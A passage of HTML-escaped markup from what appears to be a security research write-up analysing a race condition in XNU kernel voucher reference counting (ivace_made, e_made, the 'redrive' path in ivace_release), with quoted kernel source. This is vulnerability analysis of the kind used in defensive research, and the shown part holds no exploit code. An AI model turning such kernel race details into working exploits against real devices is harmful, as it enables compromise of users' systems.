class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;) only takes the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (and not in all paths; we&amp;#39;ll get to that) and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;, which increments &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;does that under the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;lock.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;should therefore &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;always&lt;/span&gt;&lt;span&gt;&amp;nbsp;get incremented before any corresponding &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. And there is a small window (marked as &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c23\"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;above) where &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which will end up with a pointer to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. If, in exactly that window shown above, another thread grabs the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and drops the last reference (&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) on the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which currently points to that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we&amp;#39;ll encounter one of the more complex situations outlined above where, in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;equal to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. The reason that there is special treatment of that case is that it&amp;#39;s indicating that there is a live pointer to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which isn&amp;#39;t yet accounted for by the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;, and therefore it&amp;#39;s not valid to free the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;user_data_value_element.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Another way to view this is that it&amp;#39;s a hack around not holding a lock across that window shown above.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;With this insight we can start to unravel the &amp;quot;redrive&amp;quot; logic:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1c71158a8af57bb6d3e831d618708883a379cc86\"&gt;&lt;/a&gt;&lt;a id=\"t.49\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;else&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Let&amp;#39;s take the first case:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock was dropped and re-acquired. If those are different, it indicates that a race did occur and another thread (or threads) revived this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(since even though the refs has gone to zero it hasn&amp;#39;t yet been removed by this thread from the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table, and even though it&amp;#39;s been marked as being released by setting &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;TRUE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;, that doesn&amp;#39;t prevent another reference being handed out on a racing thread.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;There are then two distinct sub-cases:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;1) &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;(KERN_SUCCESS == kr)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;We can now parse the meaning of this: this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;was revived but that occurred after the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;was freed on this thread. The racing thread then allocated a *new* value which happened to be exactly the same as the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has, hence the other thread getting a reference on this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;before this thread was able to remove it from the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table. Note that for the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer (making this particular case even more unlikely, but not impossible) but it isn&amp;#39;t going to always be the case that the value is a pointer; at the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;layer the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is actually a 64-bit &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c14\"&gt;handle&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;attr chooses to store a pointer there.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;So what&amp;#39;s happened in this case is that another thread has looked up an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a new &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;which happens to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c14\"&gt;collide&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;(due to having a matching pointer, but potentially different buffer contents) with the value that this thread had. I don&amp;#39;t think this actually has security implications; but it does take a while to get your head around.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If this is the case then we&amp;#39;ve ended up with a pointer to a revived ivace which now, despite having a matching &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;, is never-the-less semantically different from the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;we had when this thread entered this function. The connection between our thread&amp;#39;s idea of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;has been severed; and we need to remove our thread&amp;#39;s contribution to that; hence:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1577686d6e27cb6539edf4c668c25d37d0e6652c\"&gt;&lt;/a&gt;&lt;a id=\"t.50\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span 